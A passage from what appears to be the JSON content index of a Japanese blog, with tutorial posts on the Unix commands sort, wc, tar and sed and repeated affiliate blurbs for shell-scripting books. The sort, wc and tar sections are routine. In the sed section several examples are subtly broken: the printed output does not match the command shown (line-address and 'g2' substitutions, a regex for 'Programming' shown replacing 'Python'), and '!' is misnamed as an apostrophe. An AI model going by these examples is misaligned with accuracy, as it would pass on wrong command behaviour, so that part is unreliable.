第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-25T14:36:44+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-25-01-jot-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-25-01-jot-suzuki/","title":"（２２）【jot】シェルスクリプトコマンド活用紹介"},{"content":"sortコマンド テキストファイルを並べ替える 数値の大小で並べ替える フィールドを指定して並べ替える CSVデータを並べ替える sortコマンド概要 sortは、テキストファイルを「行単位で並べ替える」コマンドです。他のコマンドの実行結果を並べ替える場合にも使用できます。また、空白やカンマ区切りのデータに対し、並べ替えに使用するフィールドを指定することも可能です。\nsortコマンドの書式 sort [オプション] [ファイル……]\nsortコマンドの主なオプション オプション 意味 -r 逆順で並べ替える -n 文字列を数値と見なして並べ替える -u 同一行は1つ目だけを出力する -k 指定 場所と並べ替え種別を指定する（「-k 2」なら2列目、「-k 2n」なら2列目を数値として並べ替える。複数指定する場合は「-k」オプションを複数回指定する） sortコマンド詳細説明 テキストファイルを並べ替える 「sort ファイル名」で、ファイルを並べ替えます。逆順で並べ替えたい場合は「sort -r ファイル名」とします。\n以下のファイルを並べ替えてみます。\nA B A B C 実行結果は以下のとおりです。\n$ cat baz.txt | sort A A B B C 逆順にソートするには -r オプションを付けます。\n$ cat baz.txt | sort -r C B B A A 数値の大小で並べ替える sortコマンドのデフォルトでは、数字も文字と同じように並べ替えられます。例えば、「1」と「11」と「100」では、「1」→「100」→「11」の順番になります。これを数値として「1」→「11」→「100」の順で並べ替えるには、「-n」オプションを使用します。\nseqコマンドで１から１０までを出力します。\n$ seq 10 1 2 3 4 5 6 7 8 9 10 では普通に並べ替えてみます。\n$ seq 10 | sort 1 10 2 3 4 5 6 7 8 9 1の次に10が来てしまいました。文字を扱う並べ方でソートをしているからです。数値は数値を扱うことをsortコマンドに教えて上げる必要があります。 -n コマンドをつけます。n は numberのことです。\n$ seq 10 | sort -n 1 2 3 4 5 6 7 8 9 10 フィールドを指定して並べ替える 「-k」オプションを使うと、並べ替えに使用する「フィールド」を指定できます。例えば、duコマンドの結果の2番目のフィールド、つまり「ディレクトリ名」で並べ替えるには、「du -s * | sort -k 2」のように指定します。さらに、2番目のフィールドで逆順に並べ替えるならば、「du -s * | sort -k 2r」と指定します。\nまずは以下のファイルを作成します。\n2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite まずは最初のフィルド（ファイルサイズ）で並べ替えてみます。\n$ cat du.txt | sort 0\tFavorite 10141664\tDocuments 1519968\tCalibre Library 24\tDownloads 24631656\tDesktop 2912\tApplications 872\tDropbox -n オプションを付けるのを忘れてしまいました。\n次は -n オプションをつけて実行します。\n$ cat du.txt | sort -n 0\tFavorite 24\tDownloads 872\tDropbox 2912\tApplications 1519968\tCalibre Library 10141664\tDocuments 24631656\tDesktop 次は、２番目のフィールド（ディレクトリ名）で並べ替えを行います。\n$ cat du.txt | sort -k2 2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite ヒント sortコマンドはものすごく良く使います。たくさんのオプションがありますが、まずはここで紹介したオプションを覚えればほぼ問題はありません。必要になったらGoogleで検索してください。 CSVデータを並べ替える 「-k」オプションでは、空白文字を区切りとして、並べ替えに使うフィールドを指定することができます。区切り文字を変更したい場合は、「-t」オプションで使用する文字を指定します。\n例えば、CSV（comma-separated values）データの場合、区切り文字は「,（カンマ）」なので「-t ,」または「-t \u0026ldquo;,\u0026quot;」のように指定します。\nなお、3番目のフィールドの値を数値として並べ替える場合は「-k 3n」、数値としてさらに逆順で並べ替えるなら「-k 3nr」のように指定します。\nフィールドは以下のとおりです。\n連番,氏名,氏名（カタカナ）,性別,年齢,取得ポイント\n$ cat test.csv 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sortコマンドでCSVデータを扱う場合は -t オプションを使います。\nカンマ区切りの場合は -t, となります。\n年齢で並べ替えてみます。\n$ cat data.txt | sort -t, -nr -k5 8,白木俊史,シラキトシフミ,男,57,245 3,本郷末治,ホンゴウスエジ,男,56,252 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 7,児島愛子,コジマアイコ,女,39,675 2,吉野里紗,ヨシノリサ,女,38,894 6,塩谷貢,シオタニミツグ,男,34,494 1,小出里歩,オデリホ,女,27,85 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sort -t, -nr -k5\n-t, は、CSVデータの区切り文字をカンマ（,）とする\n-nr の、nは並べ替えのデータを数値として扱う\nの、rは逆順で出力する\n-k5 は、並べ替えのキーとなるフィールドを５列目とする\nという意味です。\nでは、６列目の取得ポイントの多く順に並べ替えてみます。\nbash-5.1$ cat data.txt | sort -t, -nr -k6 9,飯塚遥佳,イイヅカハルカ,女,20,974 2,吉野里紗,ヨシノリサ,女,38,894 7,児島愛子,コジマアイコ,女,39,675 4,谷村千代乃,タニムラチヨノ,女,44,556 6,塩谷貢,シオタニミツグ,男,34,494 3,本郷末治,ホンゴウスエジ,男,56,252 8,白木俊史,シラキトシフミ,男,57,245 5,内野響子,ウチノキョウコ,女,44,170 10,阿久津清蔵,アクツセイゾウ,男,9,120 1,小出里歩,オデリホ,女,27,85 ヒント csvデータのカンマ区切りは見にくいですね。 工夫してタブ区切りに変換して出力してみてください。 $ cat data.txt | sort -t, -nr -k6 | tr \u0026#34;,\u0026#34; \u0026#34;\\t\u0026#34; 9\t飯塚遥佳\tイイヅカハルカ\t女\t20\t974 2\t吉野里紗\tヨシノリサ\t女\t38\t894 7\t児島愛子\tコジマアイコ\t女\t39\t675 4\t谷村千代乃\tタニムラチヨノ\t女\t44\t556 6\t塩谷貢\tシオタニミツグ\t男\t34\t494 3\t本郷末治\tホンゴウスエジ\t男\t56\t252 8\t白木俊史\tシラキトシフミ\t男\t57\t245 5\t内野響子\tウチノキョウコ\t女\t44\t170 10\t阿久津清蔵\tアクツセイゾウ\t男\t9\t120 1\t小出里歩\tオデリホ\t女\t27\t85 ヒント ちょっと見やすくなりました（^^; 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-25T12:39:33+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-25-01-sort-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-25-01-sort-suzuki/","title":"（２１）【sort】シェルスクリプトコマンド活用紹介"},{"content":"wcコマンド 行数と単語数とバイト数を数える 文字数を数える 行数だけを表示する wcコマンド概要 「wc」はテキストファイルの行数や単語数（word count）、文字数を数えるコマンドです。単語は、空白や改行文字で区切られたものを数えます。\nwcコマンドの書式 wc [オプション] [ファイル……]\nwcコマンドの主なオプション オプション 意味 -c バイト数を表示する -m 文字数を表示する（マルチバイト文字に対応） -l 改行の数を表示する -w 単語数を表示する wcコマンド詳細説明 行数と単語数とバイト数を数える 「wc テキストファイル名」で、指定したテキストファイルの行数、単語数、バイト数が表示されます。複数のファイルを指定（ワイルドカード「*」も使用可）した場合は、各ファイルの結果と合計が表示されます。\n実行結果は以下のとおりです。\nbash-5.1$ wc index.md 158 211 7239 index.md bash-5.1$ 表示される値は左から\nファイルの行数 単語数 バイト数となります。\n文字数を数える バイト数ではなく、文字数を数えたい場合は「-m」オプションを使用します。\n実行結果は以下のとおりです。\n$ wc -m filename.txt 行数だけを表示する 行数だけをカウントしたい場合は、「-l」オプションを使用します。\n例えば、「find」コマンドは見つけたファイルを「1件1行」で出力するので、行数を数えることでファイルの個数を知ることができます。\nls -la コマンドでファイルの数を調べる\nbash-5.1$ ls -la | grep -v ^d | wc -l 9 bash-5.1$ ヒント grep -v ^d でディレクトリを除外しています。 ファイルの行数を調べる\n$ cat filename.txt | wc -l ヒント wc -m wc -l この２つは必須です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-20T11:46:21+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-20-01-wc-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-20-01-wc-suzuki/","title":"（２０）【wc】シェルスクリプトコマンド活用紹介"},{"content":"tarコマンド アーカイブファイルを作成する アーカイブファイルを展開する tarコマンド概要 「tar」は、複数のファイルを1つにまとめた“アーカイブファイル”を作成／展開するコマンドです。\n「アーカイブ（archive）」は「書庫」という意味で、プログラムのソースコードなど、複数の関連するファイル群をまとめて保管したり、配布したりする際に使用します。\ntarコマンドの書式 tar -czvf アーカイブ.tgz 対象ファイル\n（ファイルのアーカイブを作成しgzip形式で圧縮する）\ntar -xzvf アーカイブ.tgz\n（gzipで圧縮されたアーカイブを展開する）\ntarコマンドの主なオプション オプション 意味 -c 新しいアーカイブを作成する -x アーカイブからファイルを抽出する tarコマンド詳細説明 アーカイブファイルを作成する アーカイブファイルを作成するには「-c」オプション、アーカイブをgzip形式で圧縮するには「-z」オプションを指定し、「-f」オプションでアーカイブファイル名を指定します。\n$ tar -czvf archive.tgz * アーカイブファイルを展開する アーカイブファイルからファイルを取り出すことを、「展開」あるいは「抽出」と呼びます。\n展開には、先ほどの「-c」オプションの代わりに「-x」オプションを使います（画面2）。また、「-z」はgzip形式用のオプションなので、圧縮されていない場合は「-z」オプションなしで、bzip2形式（拡張子は「.tar.bz2」）の場合は「-j」オプションを使用します。\n$ tar -zxvf archive.tgz ヒント 圧縮は Create（作成）なので -czvf、展開はeXtaruct（伸長）で -xzvfです。 圧縮、展開ともに zvf は共通です。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-20T11:34:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-20-01-tar-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-20-01-tar-suzuki/","title":"（１９）【tar】シェルスクリプトコマンド活用紹介"},{"content":"sedコマンド概要 「sed」は「Stream EDitor」の略で、「sed スクリプトコマンド ファイル名」で、指定したファイルをコマンドに従って処理し、標準出力へ出力します。ファイル名を省略した場合は、標準入力からのデータを処理します。sedコマンドでは、パイプとリダイレクトを活用するのが一般的です。\nsedコマンドの書式 sed [オプション]\nsed [オプション] スクリプトコマンド 入力ファイル\nsedコマンドの主なオプション オプション 意味 -e スクリプト スクリプト（コマンド）を追加する -f スクリプトファイル 実行するコマンドとしてスクリプトファイルの内容を追加する |-t 文字数\t|タブの文字数またはタブ位置のリストを指定する|\nsedのバージョンを確認する $ sed --version 僕の環境では以下のとおりです\nbash-5.1$ sed --version gsed (GNU sed) 4.8 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Written by Jay Fenlason, Tom Lord, Ken Pizzini, Paolo Bonzini, Jim Meyering, and Assaf Gordon. This sed program was built without SELinux support. GNU sed home page: \u0026lt;https://www.gnu.org/software/sed/\u0026gt;. General help using GNU software: \u0026lt;https://www.gnu.org/gethelp/\u0026gt;. E-mail bug reports to: \u0026lt;bug-sed@gnu.org\u0026gt;. bash-5.1$ sedコマンド詳細説明 \u0026lsquo;sed\u0026rsquo;を使用した基本的なテキスト置換 sedコマンドを使用してパターンを検索および置換することにより、テキストの特定の部分を検索および置換できます。次の例では、「s」は検索および置換タスクを示します。「BashScriptingLanguage」というテキストで「Bash」という単語が検索され、その単語がテキストに存在する場合は、「Perl」という単語に置き換えられます。\nbash-5.1$ echo \u0026#34;Bash Scripting Language\u0026#34; | sed \u0026#39;s/Bash/Perl/\u0026#39; Perl Scripting Language bash-5.1$ ヒント \u0026rsquo;\u0026rsquo; シングルクォーテーションで囲む場合と\u0026quot;\u0026ldquo;ダブルクォーテーションで囲む場合、動作が異なります。置換前と、置換後の文字列指定を「文字列」で扱う場合はシングルクォーテーションで構いませんが、s/Bash/$value/ などの変数で置き換えたい場合はダブルクォーテーションで囲みます。 ヒント s/Bash/Perl/ と指定する場合の s ですが、substitute（置き換える）です。 まず、weekday.txtを作成します。\nMonday Tuesday Wednesday Thursday Friday Saturday Sunday 以下のコマンドで Sunday を　Sunday is holiday に置き換えます\n$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; 実行結果は以下のとおりです。\nbash-5.1$ cat weekday.txt | sed \u0026#39;s/Sunday/Sunday is holiday/\u0026#39; Monday Tuesday Wednesday Thursday Friday Saturday Sunday is holiday bash-5.1$ \u0026lsquo;g\u0026rsquo;オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える \u0026lsquo;g\u0026rsquo;オプションは、ファイル内の一致するパターンすべてを置き換えます。\nまずpython.txtを作成します\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 以下のコマンドで Python を perl に置き換えます。\n$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g\u0026#39; perl is a very popular language. perl is easy to use. perl is easy to learn. perl is a cross-platform language ヒント s/Python/perl/g と指定する場合の g ですが、global(全体的に）です。 次に２行目の Python を perlに置き換えます。\n置き換えたい行数を 2 と指定しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; python.txt 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;2 s/Python/perl/g\u0026#39; Python is a very popular language. perl is easy to use. perl is easy to learn. Python is a cross-platform language 各行で一致する2番目の値のみを置き換える ファイル中に存在するPythonを、各行の2番目に出現する検索パターンだけをperlに置き換えます。\ng2オプションを使います。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/Python/perl/g2\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ 各行で一致する最後の値のみを置き換える ファイル中に存在するPythonを、各行の最後に出現する検索パターンだけをperlに置き換えます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\nbash-5.1$ cat python.txt | sed \u0026#39;s/\\(.*\\)Programming/\\1Scripting/\u0026#39; Python is a very popular language. Python is easy to use. perl is easy to learn. Python is a cross-platform language bash-5.1$ ヒント \\(.*\\) の部分は正規表現といいます。正規表現は記号を含めて無限に指定することができる激しく便利な機能です。ポピュラーな使い方から覚えて、次第と複雑でトリッキーな使い方を習得していけば良いと思います。Google で sed 正規表現　と検索すればたくさん検索結果が出てきます。 ファイル内の最初の一致を新しいテキストに置き換える 次のコマンドは、検索パターンの最初の一致である「Python」のみをテキスト「perl」に置き換えます。ここで、「1」はパターンの最初の出現に一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;1 s/Python/perl/\u0026#39; perl is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language ファイル内の最後の一致を新しいテキストに置き換える 次のコマンドは、最後に出現した検索パターン「Python」をテキスト「Bash」に置き換えます。ここで、「$」記号は、パターンの最後の出現と一致するために使用されます。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language 実行結果は以下のとおりです。\n$ cat python.txt | sed \u0026#39;$s/Python/perl/\u0026#39; Python is a very popular language. Python is easy to use. Python is easy to learn. perl is a cross-platform language ヒント 「ファイル内」の最後のマッチです。 ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ 検索および置換するには、ファイルパスのバックスラッシュをエスケープする必要があります。次のsedコマンドは、ファイルパスにバックスラッシュ記号（\\）を追加します。\nヒント \\記号はウインドウズだと￥で表示されます。\nMacでは￥キーを押すことで\\バックスラッシュを入力することできます。\nMacで￥キーを押してもバックスラッシュが入力できない場合は、はOptionキーを押しながら￥を押すことでバックスラッシュを入力することができます。一般的に￥と\\は区別されています。 実行結果は以下のとおりです。\n$ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s;/;\\\\/;g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl $ $ echo /home/ubuntu/code/perl/add.pl | sed \u0026#39;s|/|\\\\/|g\u0026#39; \\/home\\/ubuntu\\/code\\/perl\\/add.pl ヒント 上記では「s;」とすることで、セミコロンを区切り文字として指定しています。理由は見た目がわかりやすいからです。\n何でもいいのです。「s|」とすれば、区切り文字はパイプに指定することができます。 ファイルのフルパスをファイル名だけに置き換える ファイル名は、basenameコマンドを使用してファイルパスから非常に簡単に取得できますが、sedコマンドを使用して、ファイルパスからファイル名を取得することもできます。次のコマンドは、echoコマンドで指定されたファイルパスからのみファイル名を取得します。\n$ basename \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; myfile.txt $ echo \u0026#34;/home/ubuntu/temp/myfile.txt\u0026#34; | sed \u0026#39;s/.*\\///\u0026#39; myfile.txt $ ヒント basename コマンドを使うのが一般的ですが、sedに置き換えることでsedの正規表現の理解を深めることが狙いです。 マッチした文字列のあとに出現した文字列が見つかった場合に置換する 次のsedコマンドでは、2つの置換コマンドが使用されています。文字列「CSE 」でマッチした行で「Count 」は100に置き換えられ、文字列「EEE」でマッチした行で「Count」は70に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed -e \u0026#39;/CSE/ s/Count/100/; /EEE/ s/Count/70/;\u0026#39; CSE - 100 EEE - 70 Civil - Count ヒント 以外に知られていないトリッキーなsedの利用例ですが、とてもよく使われます。 文字列に他のテキストが見つからない場合のみテキストを置き換える 次のsedコマンドは、テキスト「CSE」を含まない行の「Count」値を置き換えます。dept.txtファイルには、テキスト「CSE」を含まない2行が含まれています。したがって、「カウント」テキストは2行で80に置き換えられます。\nCSE - Count EEE - Count Civil - Count 実行結果は以下のとおりです。\n$ cat dept.txt | sed \u0026#39;/CSE/! s/Count/80/;\u0026#39; CSE - Count EEE - 80 Civil - 80 ヒント !（アポストロフィー）をつけると「以外は」という意味になります。 \u0026rsquo; \\ 1 \u0026lsquo;を使用して、一致するパターンの前に文字列を追加 sedコマンドで一致するパターンマッチは、「\\1」、「\\2」などで示されます。\n次のsedコマンドは、パターン\u0026rsquo;Bash\u0026rsquo;を検索し、パターンが一致する場合は、テキストを置き換える部分「bash」を\u0026rsquo;\\1\u0026rsquo;として処理をします。\nここでは、入力テキストで「Bash」というテキストが検索され、「\\1」の前に1つのテキストが追加され、後に別のテキストが追加されます。\n$ echo \u0026#34;Bash language\u0026#34; | sed \u0026#39;s/\\(Bash\\)/Learn \\1 programming/\u0026#39; Learn Bash programming language ヒント 難しく考える必要はありません。\u0026rsquo;s/(文字列)/ で文字列を検索します。その後、検索した文字列を \\1 として、文字A \\1 文字B として出力します。 一致する行を削除 \u0026rsquo;d\u0026rsquo;オプションは、ファイルから任意の行を削除するためにsedコマンドで使用されます。os.txtという名前のファイルを作成し、次のコンテンツを追加して、 「d」オプションの機能をテストします。\nWindows Linux Android OS 